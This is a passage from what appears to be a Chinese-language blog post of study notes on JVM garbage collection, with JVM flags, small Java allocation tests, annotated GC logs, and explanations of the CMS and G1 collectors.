    //  byte[] myAlloc4  = new byte[2 * size]; // 创建之后每一个元素都是0   添加上这行代码便可垃圾回收
        System.out.println(&quot;hello world&quot;);
    }
}
//随着上边数组的参数的变化，结果不一样。
&amp;gt; Task :MyTest1.main()
GC (Allocation Failure) [PSYoungGen: 6815K-&amp;gt;544K(9216K)] 6815K-&amp;gt;6696K(19456K), 0.0042369 secs] [Times: user=0.04 sys=0.01, real=0.00 secs] 
// GC（分配失败）。  PSYoungGen = Parallel Scavenge收集器；  新生代的空间是9M  、
// 6815 - 544 = 6371执行完gc之后,新生代释放的空间容量
// 6815 - 6696 = 119执行完gc之后，总的堆空间释放的空间容量 
[Full GC (Ergonomics) [PSYoungGen: 544K-&amp;gt;0K(9216K)] [ParOldGen: 6152K-&amp;gt;6426K(10240K)] 6696K-&amp;gt;6426K(19456K), [Metaspace: 2798K-&amp;gt;2798K(1056768K)], 0.0043323 secs] [Times: user=0.03 sys=0.00, real=0.00 secs] 
// Full GC(Ergonomics 工程学) ， 会让业务线程暂停。    新生代被清空了。老年代不减反增。
  // 对元空间也进行了垃圾回收，但是一个字节都没有被回收。
hello world
Heap            （ 0x00000007bf600000  内存占据的空间地址。）
 PSYoungGen      total 9216K, used 2290K [0x00000007bf600000, 0x00000007c0000000, 0x00000007c0000000) 
  eden space 8192K, 27% used [0x00000007bf600000,0x00000007bf83c8d8,0x00000007bfe00000)
  from space 1024K, 0% used [0x00000007bfe00000,0x00000007bfe00000,0x00000007bff00000)
  to   space 1024K, 0% used [0x00000007bff00000,0x00000007bff00000,0x00000007c0000000)
 ParOldGen       total 10240K, used 6426K [0x00000007bec00000, 0x00000007bf600000, 0x00000007bf600000)
 //老年代的空间是10M                                           
  object space 10240K, 62% used [0x00000007bec00000,0x00000007bf246998,0x00000007bf600000)
 Metaspace       used 2805K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 291K, capacity 386K, committed 512K, reserved 1048576K

 数组大小设置的不同，出现的情况不同：                              
 2 2 2 2 的时候出现Full GC 
 2 2 3 3 的时候就没有出现Full GC了。 
 '出现上述情况的原因：当新生代的空间不够完成分配时，直接会在老年代的空间完成分配。  
           
jdk1.8默认的使用的垃圾回收期为：                                  
PSYoungGen: Parallel Scavenge (新生代垃圾收集器)
ParOldGen:Parallel Old  (老年代垃圾收集器)&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;JVM的默认参数 查看： java -XX:+PrintCommandLineFlags -version&lt;/p&gt;
&lt;p&gt;UseParallelGC ： 默认的是使用ParallelGC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0nzj94bcj317o0actb5.jpg&quot; alt=&quot;image-20200218170631737&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;阈值和垃圾收集器类型对于对象分配的影响实践分析&quot;&gt;阈值和垃圾收集器类型对于对象分配的影响实践分析&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;VM options:
-verbose:gc     //会输出详细的垃圾回收的日志
-Xms20M                 //堆容量的初始大小
-Xmx20M                 //堆容量的最大大小   -- 两个值一般设置为一样的，这样不会出现抖动的现象。
-Xmn10M                 //新生代的大小是10M  
-XX:+PrintGCDetails     //打印出垃圾回收详细的信息 
-XX:SurvivorRatio=8     //eden和 survivor的比例为8:1的比例。  
-XX:PretenureSizeThreshold=4194304  // 大小的阈值  4M的大小 新建的对象大小超过4M直接在老年代生成
-XX:+UseSerialGC     //阈值的使用，需要搭配串行垃圾的收集器 -不添加此参数，上一个参数不起作用。

/**
PretenureSizeThreshold: 设置对象超过多大时，直接在老年代进行分配空间
*/
// 执行前添加上述参数
public class MyTest2 {
    public static void main(String[] args) {
        int size = 1024 * 1024; // 1M 的容量
        byte[] myAlloc1  = new byte[5 * size]; // 创建之后每一个元素都是0
    }
}

数组的大小设置为5 和8 和10 的结果各不一样。
'使用之前介绍工具，可以查看当前执行的所有的内存分布情况及垃圾回收情况'
System.gc(): 对JVM进行一次 Full GC 。&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;maxtenuringthreshold与阈值的动态调整详解&quot;&gt;MaxtenuringThreshold与阈值的动态调整详解&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;-verbose:gc     //会输出详细的垃圾回收的日志
-Xms20M                 //堆容量的初始大小
-Xmx20M                 //堆容量的最大大小   -- 两个值一般设置为一样的，这样不会出现抖动的现象。
-Xmn10M                 //新生代的大小是10M  
-XX:+PrintGCDetails     //打印出垃圾回收详细的信息 
-XX:+PrintCommandLineFlags // 打印命令行的标志，我们自己设置的启动参数
-XX:SurvivorRatio=8     //eden和 survivor的比例为8:1的比例。  
-XX:MaxTenuringThreshold=5 //在可以自动调节对象晋升（Promote）到老年代阈值的GC中，设置该阈值的最大值。
-XX:+PrintTenuringDistribution  // 打印出年龄为1的字节，年龄为2的字节，等等

/**
MaxtenuringThreshold作用：在可以自动调节对象晋升（Promote）到老年代阈值的GC中，设置该阈值的最大值。该参数的默认值为15，CMS中默认值为6，G1中默认为15（在JVM中，该数值是由4个bit来表示的，1111，即15）
    
经历了多次GC后，新生代存货的对象会在From Survivor与To Survivor之间来回存放，而这里面的一个前提则是这两个空间有足够的大小来存放这些数据。在GC算法中，会计算每一个对象年龄的大小，如果达到某个年龄后发现总大小已经大于Survivor空间的50%，那么这时候就需要调整阈值，不能再继续等到默认的15次GC后才完成晋升，因为这样会导致Survivor空间不足，所以需要调整阈值，让这些存活对象尽快完成晋升。

*/
 //  执行前添加上述参数
public class MyTest3 {
    public static void main(String[] args) {
        int size = 1024 * 1024; // 1M 的容量
        byte[] myAlloc1  = new byte[2 * size]; 
        byte[] myAlloc2  = new byte[2 * size];
        byte[] myAlloc3  = new byte[2 * size];
        byte[] myAlloc4  = new byte[2 * size]; 
        sout(&quot;hello world&quot;);
    }
}

&amp;gt; 输出结果:
&amp;gt; Task :MyTest3.main()
  // PrintCommandLineFlags 打印命令行的标志，我们自己设置的启动参数
-XX:InitialHeapSize=20971520 -XX:InitialTenuringThreshold=5 -XX:MaxHeapSize=20971520 -XX:MaxNewSize=10485760 -XX:MaxTenuringThreshold=5 -XX:NewSize=10485760 -XX:+PrintCommandLineFlags -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintTenuringDistribution -XX:SurvivorRatio=8 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC 
[GC (Allocation Failure) 
Desired survivor size 1048576 bytes, new threshold 5 (max 5)
[PSYoungGen: 6815K-&amp;gt;560K(9216K)] 6815K-&amp;gt;6712K(19456K), 0.0036073 secs] [Times: user=0.04 sys=0.00, real=0.01 secs] 
[Full GC (Ergonomics) [PSYoungGen: 560K-&amp;gt;0K(9216K)] [ParOldGen: 6152K-&amp;gt;6426K(10240K)] 6712K-&amp;gt;6426K(19456K), [Metaspace: 2798K-&amp;gt;2798K(1056768K)], 0.0032972 secs] [Times: user=0.03 sys=0.00, real=0.00 secs] 
hello world
Heap
 PSYoungGen      total 9216K, used 2290K [ 0x00000007c0000000, 0x00000007c0000000)
  eden space 8192K, 27% used [0x00000007bf600000,0x00000007bf83c8d8,0x00000007bfe00000)
  from space 1024K, 0% used [0x00000007bfe00000,0x00000007bfe00000,0x00000007bff00000)
  to   space 1024K, 0% used [0x00000007bff00000,0x00000007bff00000,0x00000007c0000000)
 ParOldGen       total 10240K, used 6426K [ 0x00000007bf600000, 0x00000007bf600000)
  object space 10240K, 62% used [0x00000007bec00000,0x00000007bf246998,0x00000007bf600000)
 Metaspace       used 2805K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 291K, capacity 386K, committed 512K, reserved 1048576K
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;VM options: 
-verbose:gc     //会输出详细的垃圾回收的日志
-Xms200M                //堆容量的初始大小
-Xmn50M                 //新生代的大小是50M  
-XX:TargetSurvivorRatio=60  // 当Survivor空间占据了百分之60，将从新计算阈值。
-XX:+PrintTenuringDistribution  // 打印出年龄为1的字节，年龄为2的字节，等等
-XX:+PrintGCDetails     //打印出垃圾回收详细的信息 
-XX:+PrintGCDateStamps //打印垃圾回收的时间戳
-XX:+UseConcMarkSweepGC  //设置老年代的垃圾回收器  
-XX:+UseParNewGC  //设置新生代的垃圾回收器
-XX:MaxTenuringThreshold=3 //在可以自动调节对象晋升（Promote）到老年代阈值的GC中，设置该阈值的最大值。

// 综合的例子
public class MyTest4 {
    public static void main(String[] args) throws InterruptedException {
        byte[] byte_1  = new byte[512 * 1024];
        byte[] byte_2  = new byte[512 * 1024];

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;1111111这里进行了垃圾回收&quot;);

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;2222222这里进行了垃圾回收&quot;);

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;3333333这里进行了垃圾回收&quot;);

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;4444444这里进行了垃圾回收&quot;);

        byte[] byte_3  = new byte[1024 * 1024];
        byte[] byte_4  = new byte[1024 * 1024];
        byte[] byte_5  = new byte[1024 * 1024];

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;55555555这里进行了垃圾回收&quot;);

        myGc();
        Thread.sleep(1000);
        System.out.println(&quot;66666666这里进行了垃圾回收&quot;);

        System.out.println(&quot;hello world&quot;);
    }

    private static void myGc(){
        // 真正会被收集的数组。方法调用介绍之后就会被垃圾回收。
        for(int i = 0 ;i&amp;lt;40;i++){
            byte[] byteArray = new byte[1024*1024];
        }
    }
}

》输出结果：
&amp;gt; Task :MyTest4.main()
2020-02-18T19:44:39.419-0800: [GC (Allocation Failure) 2020-02-18T19:44:39.419-0800: [ParNew
Desired survivor size 3145728 bytes,' new threshold 3 (max 3)
- age   1:    1339912 bytes,    1339912 total
: 40551K使用空间-&amp;gt;1361K垃圾回收后大小(46080K总大小), 0.0014325 secs] 40551K-&amp;gt;1361K(199680K), 0.0014891 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] 
//3145728 bytes = 3M  50*0.1*0.6 = 3M
1111111这里进行了垃圾回收
2020-02-18T19:44:40.430-0800: [GC (Allocation Failure) 2020-02-18T19:44:40.430-0800: [ParNew
Desired survivor size 3145728 bytes,' new threshold 3 (max 3)
- age   1:        584 bytes,        584 total
- age   2:    1338144 bytes,    1338728 total
: 42100K-&amp;gt;1409K(46080K), 0.0012810 secs] 42100K-&amp;gt;1409K(199680K), 0.0013128 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] 
2222222这里进行了垃圾回收
2020-02-18T19:44:41.435-0800: [GC (Allocation Failure) 2020-02-18T19:44:41.435-0800: [ParNew
Desired survivor size 3145728 bytes,' new threshold 3 (max 3)
- age   1:         72 bytes,         72 total
- age   2:        584 bytes,        656 total
- age   3:    1337920 bytes,    1338576 total
: 41940K-&amp;gt;1439K(46080K), 0.0005344 secs] 41940K-&amp;gt;1439K(199680K), 0.0005592 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] 
3333333这里进行了垃圾回收
2020-02-18T19:44:42.441-0800: [GC (Allocation Failure) 2020-02-18T19:44:42.441-0800: [ParNew
Desired survivor size 3145728 bytes, 'new threshold 3 (max 3)
- age   1:         72 bytes,         72 total
- age   2:         72 bytes,        144 total
- age   3:        584 bytes,        728 total
: 42170K-&amp;gt;60K(46080K), 0.0027252 secs] 42170K-&amp;gt;1397K(199680K), 0.0027533 secs] [Times: user=0.01 sys=0.01, real=0.00 secs] 
4444444这里进行了垃圾回收
2020-02-18T19:44:43.454-0800: [GC (Allocation Failure) 2020-02-18T19:44:43.454-0800: [ParNew
Desired survivor size 3145728 bytes, 'new threshold 1 (max 3)  // 当前的年龄为1 重新设置了阈值
- age   1:    3145848 bytes,    3145848 total
- age   2:         72 bytes,    3145920 total
- age   3:         72 bytes,    3145992 total
: 40794K-&amp;gt;3087K(46080K), 0.0019052 secs] 42131K-&amp;gt;4424K(199680K), 0.0019409 secs] [Times: user=0.02 sys=0.00, real=0.00 secs] 
55555555这里进行了垃圾回收
2020-02-18T19:44:44.465-0800: [GC (Allocation Failure) 2020-02-18T19:44:44.465-0800: [ParNew
Desired survivor size 3145728 bytes,' new threshold 3 (max 3)
- age   1:         80 bytes,         80 total
: 43823K-&amp;gt;4K(46080K), 0.0026372 secs] 45160K-&amp;gt;4413K(199680K), 0.0026724 secs] [Times: user=0.03 sys=0.00, real=0.00 secs] 
66666666这里进行了垃圾回收
hello world
Heap
 par new generation   total 46080K, used 13912K [0x00000006c3200000, 0x00000006c3200000)
  eden space 40960K,  33% used [0x00000006c0000000, 0x00000006c0d95228, 0x00000006c2800000)
  from space 5120K,   0% used [0x00000006c2800000, 0x00000006c2801020, 0x00000006c2d00000)
  to   space 5120K,   0% used [0x00000006c2d00000, 0x00000006c2d00000, 0x00000006c3200000)
 concurrent mark-sweep generation total 153600K, used 4409K [0x00000006c3200000, 0x00000006cc800000, 0x00000007c0000000)
 Metaspace       used 2806K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 291K, capacity 386K, committed 512K, reserved 1048576K
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;cms垃圾回收器新版本不建议使用&quot;&gt;CMS垃圾回收器（新版本不建议使用）&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;CMS 垃圾回收器，复杂性比较高。在jdk新版本中不建议被使用。&lt;/p&gt;
&lt;p&gt;CMS（Concurrent Mark Sweep）：并发标记清除&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;枚举根节点概念&quot;&gt;枚举根节点概念&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0szew9nsj31rm0u04ih.jpg&quot; alt=&quot;image-20200218195923581&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;安全点safepoint概念&quot;&gt;安全点（Safepoint）概念&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0t1r7yeyj31o40u01kx.jpg&quot; alt=&quot;image-20200218200138311&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;程序执行时，并非在所有地方都能停顿下来开始GC，只有在达到安全点时才能暂停。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0t3sqqkij31p30u01kx.jpg&quot; alt=&quot;image-20200218200336027&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;安全点的选定基本上是以“是否具有让程序长时间执行的特征”为标准来进行选定的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0t6o61pyj31v20t07sl.jpg&quot; alt=&quot;image-20200218200622418&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;主动式中断：轮询标志的地方和安全点是重合的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;安全区域safe-region概念&quot;&gt;安全区域（Safe Region）概念&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tbrs4o5j31m00u01kx.jpg&quot; alt=&quot;image-20200218201116346&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tb0bphxj31rk0qe4ju.jpg&quot; alt=&quot;image-20200218201032392&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;cms垃圾收集器深入详解&quot;&gt;CMS垃圾收集器深入详解&lt;/h4&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;CMS收集器，以获取&lt;code&gt;最短回收停顿时间&lt;/code&gt;为目标，多数应用于互联网站或者BS系统的服务器端上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tfme3nqj31h20u07uu.jpg&quot; alt=&quot;image-20200218201457879&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tibcnv0j31iv0u07sj.jpg&quot; alt=&quot;image-20200218201733833&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tl6attgj31iw0u0nkw.jpg&quot; alt=&quot;image-20200218202018765&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;初始标记的时候，会Stop the world , 此时没有用户线程执行。&lt;/p&gt;
&lt;p&gt;并发标记的时候，可以与用户线程同时执行。&lt;/p&gt;
&lt;p&gt;重新标记的时候，会Stop the world , 此时也没有用户线程执行。&lt;/p&gt;
&lt;p&gt;并发清除的时候，可以与用户线程同时执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tp5n4tij31ty0k0n5f.jpg&quot; alt=&quot;image-20200218202408587&quot;/&gt;&lt;/p&gt;
&lt;p&gt;停顿，停顿的是用户线程停顿的少。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tpne0soj31g60u0e81.jpg&quot; alt=&quot;image-20200218202435285&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ttyv594j31s20scnjw.jpg&quot; alt=&quot;image-20200218202845482&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;cms收集器收集步骤&quot;&gt;CMS收集器收集步骤&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/Users/erwa/Library/Application%20Support/typora-user-images/image-20200218203158095.png&quot; alt=&quot;image-20200218203158095&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;ol&gt;&lt;li&gt;初始标记&lt;/li&gt;
&lt;li&gt;并发标记&lt;/li&gt;
&lt;li&gt;并发预先清理阶段&lt;/li&gt;
&lt;li&gt;并发可丢弃的阶段&lt;/li&gt;
&lt;li&gt;最终的重新标记&lt;/li&gt;
&lt;li&gt;并发清除&lt;/li&gt;
&lt;li&gt;并发重置&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;出现Concurrent即代表GC线程可以和用户线程同步执行的阶段。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0tz41wkbj31bj0u0avv.jpg&quot; alt=&quot;image-20200218203341656&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0u0dr9qij31b00u07wh.jpg&quot; alt=&quot;image-20200218203454390&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0u5ht7b6j317g0qch4r.jpg&quot; alt=&quot;image-20200218203950009&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ubph4toj317g0jk7gc.jpg&quot; alt=&quot;image-20200218204548449&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ucryeetj317c0o0k9i.jpg&quot; alt=&quot;image-20200218204650881&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0udun1fzj316s0fg47v.jpg&quot; alt=&quot;image-20200218204749664&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将标记拆分成了前5个阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0uegf60dj317o0smdy2.jpg&quot; alt=&quot;image-20200218204826808&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ueqjyakj31600c4jwu.jpg&quot; alt=&quot;image-20200218204843337&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ufjmne2j315w0daagl.jpg&quot; alt=&quot;image-20200218204929489&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ug79utlj316u0pkdyd.jpg&quot; alt=&quot;image-20200218205007371&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;举例分析cms垃圾收集器执行过程&quot;&gt;举例分析CMS垃圾收集器执行过程&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;-verbose:gc     //会输出详细的垃圾回收的日志
-Xms20M                 //堆容量的初始大小
-Xmx20M                 //堆容量的最大大小   -- 两个值一般设置为一样的，这样不会出现抖动的现象。
-Xmn10M                 //新生代的大小是10M  
-XX:+PrintGCDetails     //打印出垃圾回收详细的信息 
-XX:SurvivorRatio=8     //eden和 survivor的比例为8:1的比例。  
-XX:UseConcMarkSweepGC      //指定老年代的收集器

/**

*/
 //  执行前添加上述参数
public class MyTest5 {
    public static void main(String[] args) {
        int size = 1024 * 1024; // 1M 的容量
        byte[] myAlloc1  = new byte[4 * size]; 
          sout(&quot;111111&quot;);
        byte[] myAlloc2  = new byte[4 * size];
          sout(&quot;222222&quot;);
        byte[] myAlloc3  = new byte[4 * size];
          sout(&quot;3333333&quot;);
        byte[] myAlloc4  = new byte[2 * size];  // 这个地方设置成4的话，也会报错。
        sout(&quot;44444444&quot;);
    }
}

》 CMS垃圾收集器 垃圾回收的7步骤。
&amp;gt; Task :MyTest5.main()
111111
[GC (Allocation Failure) [ParNew: 4767K-&amp;gt;353K(9216K), 0.0023425 secs] 4767K-&amp;gt;4451K(19456K), 0.0023675 secs] [Times: user=0.03 sys=0.00, real=0.00 secs] 
222222
[GC (Allocation Failure) [ParNew: 4607K-&amp;gt;437K(9216K), 0.0027693 secs] 8705K-&amp;gt;8633K(19456K), 0.0028041 secs] [Times: user=0.03 sys=0.01, real=0.00 secs] 
[GC (CMS Initial Mark) // 第一步
 [1 CMS-initial-mark: 8196K'已使用空间大小'(10240K'老年代总的空间大小')] 12729K(19456K'堆的总空间'), 0.0004582 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
[CMS-concurrent-mark-start] // 第二部
3333333
[CMS-concurrent-mark: 0.000/0.000 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
[CMS-concurrent-preclean-start] // 第三部
[CMS-concurrent-preclean: 0.000/0.000 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
[CMS-concurrent-abortable-preclean-start]   // 第四部
[CMS-concurrent-abortable-preclean: 0.000/0.000 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
[GC (CMS Final Remark)  // 第五步
    [YG occupancy: 6904 K (9216 K)][Rescan (parallel) , 0.0005171 secs][weak refs processing, 0.0000047 secs][class unloading, 0.0003175 secs][scrub symbol table, 0.0002325 secs][scrub string table, 0.0001332 secs][1 CMS-remark: 8196K(10240K)] 15100K(19456K), 0.0012469 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] 
[CMS-concurrent-sweep-start]  //第六部
44444444
[CMS-concurrent-sweep: 0.000/0.000 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
[CMS-concurrent-reset-start]  // 第七部
[CMS-concurrent-reset: 0.000/0.000 secs] [Times: user=0.00 sys=0.00, real=0.00 secs] 
Heap
 par new generation   total 9216K, used 7068K [0x00000007bec00000, 0x00000007bf600000, 0x00000007bf600000)
  eden space 8192K,  80% used [0x00000007bec00000, 0x00000007bf279f40, 0x00000007bf400000)
  from space 1024K,  42% used [0x00000007bf400000, 0x00000007bf46d400, 0x00000007bf500000)
  to   space 1024K,   0% used [0x00000007bf500000, 0x00000007bf500000, 0x00000007bf600000)
 concurrent mark-sweep generation total 10240K, used 8196K [0x00000007bf600000, 0x00000007c0000000, 0x00000007c0000000)
 Metaspace       used 2806K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 291K, capacity 386K, committed 512K, reserved 1048576K&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;g1gerbage-first-collector目前被主流使用&quot;&gt;G1（Gerbage First Collector）（目前被主流使用）&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;从JDK9开始，G1已经成为了默认的垃圾收集器。&lt;/p&gt;
&lt;p&gt;物理内存中的新生代与老年代被消除。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1c5x2rjdj31hz0u0u0x.jpg&quot; alt=&quot;image-20200219070255660&quot;/&gt;&lt;/p&gt;
&lt;p&gt;系统吞吐量几个重要参数：QPS（TPS）、并发数、响应时间&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;QPS（TPS）：&lt;/strong&gt;每秒钟request/事务 数量&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;并发数：&lt;/strong&gt; 系统同时处理的request/事务数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;响应时间：&lt;/strong&gt; 一般取平均响应时间&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1c9g154jj31nq0u0e81.jpg&quot; alt=&quot;image-20200219070622204&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1ccbvh55j31ki0u0b29.jpg&quot; alt=&quot;image-20200219070858423&quot;/&gt;&lt;/p&gt;
&lt;p&gt;G1有很好的吞吐量和响应能力。&lt;/p&gt;
&lt;h4 id=&quot;g1收集器的设计目标&quot;&gt;G1收集器的设计目标&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1cetxr9oj31i50u0npd.jpg&quot; alt=&quot;image-20200219071134726&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;强调： GC停顿时间更加可控。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1cm3cwmvj31li0u0qv5.jpg&quot; alt=&quot;image-20200219071833361&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;G1可以回收部分老年代，CMS要回收全部的老年代。&lt;/p&gt;
&lt;p&gt;所以说G1在停顿时间上更可控。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1d4sig4pj314a0u0x0z.jpg&quot; alt=&quot;image-20200219073631465&quot;/&gt;&lt;/p&gt;
&lt;p&gt;哇，竟然都学过了。图中的内容也都知道，但是刚拿到这个图的时候不敢去看他。&lt;/p&gt;
&lt;p&gt;execution engine ： 执行引擎&lt;/p&gt;
&lt;p&gt;JIT compiler ：即时编译器。&lt;/p&gt;
&lt;p&gt;internal : 内部的 native : 本地的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1d7g825cj313v0u0aon.jpg&quot; alt=&quot;image-20200219073905525&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1收集器堆结构划分&quot;&gt;G1收集器堆结构划分&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1ddvk7thj31290u0k59.jpg&quot; alt=&quot;image-20200219074517106&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;整个堆空间，不做块的区分。就当成是一个堆空间。每一个空间的使用情况都可能是三种情况之一。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1difbajmj31hf0u0u0x.jpg&quot; alt=&quot;image-20200219074937169&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;对每种分代内存的大小，可以动态变化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dospzfoj31kn0u0e81.jpg&quot; alt=&quot;image-20200219075542713&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1-vs-cms&quot;&gt;G1 vs CMS&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1drj0712j31lm0u0qv5.jpg&quot; alt=&quot;image-20200219075821884&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这些差异，源于G1对物理模型设计的变化。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dtoojc6j31lw0u0u0x.jpg&quot; alt=&quot;image-20200219080026755&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1重要概念&quot;&gt;G1重要概念&lt;/h4&gt;
&lt;h5 id=&quot;分区region&quot;&gt;分区（Region）&lt;/h5&gt;
